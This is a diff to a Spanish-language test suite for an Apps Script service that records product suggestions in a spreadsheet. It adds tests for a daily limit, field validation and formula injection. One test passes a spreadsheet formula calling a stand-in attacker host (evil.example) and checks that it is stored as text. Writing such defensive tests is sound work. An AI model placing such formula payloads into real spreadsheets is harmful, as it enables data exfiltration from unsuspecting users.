@@ -175,9 +175,9 @@ function createMockEnvironment() {
 
   // 6. Límites: tope diario (> 300) -> rechazo
   {
-    const { code, cacheStore } = createMockEnvironment();
+    const { code, propsStore } = createMockEnvironment();
     const today = new Date().toISOString().slice(0, 10);
-    cacheStore["day:" + today] = "300";
+    propsStore.DAILY = JSON.stringify({ d: today, n: 300 });
     const res = code.doPost({ postData: { contents: JSON.stringify(validPayload) } });
     check("Límites: tope diario de 300 sugerencias alcanzado -> rechazo", res.json.ok === false && res.json.e === "limite_dia", JSON.stringify(res.json));
   }
@@ -228,6 +228,58 @@ function createMockEnvironment() {
 
     check("doGet op=ack: marca la fila como procesada y ya no sale en pendientes",
       ackRes.json.ok === true && ackRes.json.procesados === 1 && getResAfter.json.filas.length === 0 && sheetData[1][9] === "procesado");
+  }
+
+  // 11. Tope diario: vive en PropertiesService (CacheService expira a las 6 h) y se reinicia al cambiar de día
+  {
+    const { code, propsStore } = createMockEnvironment();
+    propsStore.DAILY = JSON.stringify({ d: "2000-01-01", n: 300 });
+    const res = code.doPost({ postData: { contents: JSON.stringify(validPayload) } });
+    const daily = JSON.parse(propsStore.DAILY);
+    check("Tope diario: se guarda en PropertiesService y se reinicia en un día nuevo",
+      res.json.ok === true && daily.n === 1 && daily.d === new Date().toISOString().slice(0, 10), propsStore.DAILY);
+  }
+
+  // 12. Inyección de fórmulas en la hoja: nada se guarda como fórmula
+  {
+    const { code, sheetData } = createMockEnvironment();
+    const p = Object.assign({}, validPayload, { producto: '=IMPORTXML("evil.example/x","//a")' });
+    const res = code.doPost({ postData: { contents: JSON.stringify(p) } });
+    const row = sheetData[1] || [];
+    const formula = row.some((v) => typeof v === "string" && /^[=+\-@]/.test(v));
+    check("Hoja: un producto que empieza con «=» se guarda como texto, no como fórmula",
+      res.json.ok === true && !formula && String(row[5]).startsWith("'="), JSON.stringify(row));
+  }
+
+  // 13. ext y país con formato estricto
+  {
+    const bad = [{ ext: "=1+1" }, { ext: "3.2.0 beta" }, { pais: "=A1" }, { pais: "@MX" }, { pais: "M".repeat(21) }];
+    for (const b of bad) {
+      const { code, sheetData } = createMockEnvironment();
+      const res = code.doPost({ postData: { contents: JSON.stringify(Object.assign({}, validPayload, b)) } });
+      check(`doPost: formato inválido rechazado (${JSON.stringify(b).slice(0, 30)})`, res.json.ok === false && sheetData.length === 1, JSON.stringify(res.json));
+    }
+    const { code } = createMockEnvironment();
+    const res = code.doPost({ postData: { contents: JSON.stringify(Object.assign({}, validPayload, { pais: "Reino Unido" })) } });
+    check("doPost: país con nombre largo («Reino Unido») se acepta", res.json.ok === true, JSON.stringify(res.json));
+  }
+
+  // 14. Contrato con la extensión: cada tienda de sites.json (dominio + país tal como lo manda la tarjeta) es aceptada
+  {
+    const sites = require(path.join(__dirname, "..", "extension", "data", "sites.json")).sitios || [];
+    const lista = Array.isArray(sites) ? sites : Object.values(sites);
+    const rechazadas = [];
+    for (const st of lista) {
+      if (!st || !st.d) continue;
+      const { code } = createMockEnvironment();
+      const p = Object.assign({}, validPayload, { tienda: String(st.d).replace(/^www\./, ""), pais: String(st.pais || "MX").slice(0, 20) });
+      const res = code.doPost({ postData: { contents: JSON.stringify(p) } });
+      if (res.json.ok !== true) rechazadas.push(`${st.d}/${st.pais}: ${res.json.e}`);
+    }
+    check(`Contrato: las ${lista.length} tiendas de sites.json pasan la validación del servicio`, lista.length > 100 && rechazadas.length === 0, rechazadas.slice(0, 5).join("; "));
+    const { code } = createMockEnvironment();
+    const res = code.doPost({ postData: { contents: JSON.stringify(Object.assign({}, validPayload, { tienda: "amazon méxico" })) } });
+    check("Contrato: un nombre de tienda («Amazon México») en vez de dominio se rechaza", res.json.ok === false && res.json.e === "tienda_invalida");
   }
 
   console.log(`\n${pass}/${total} pruebas de Apps Script sugerencias correctas`);
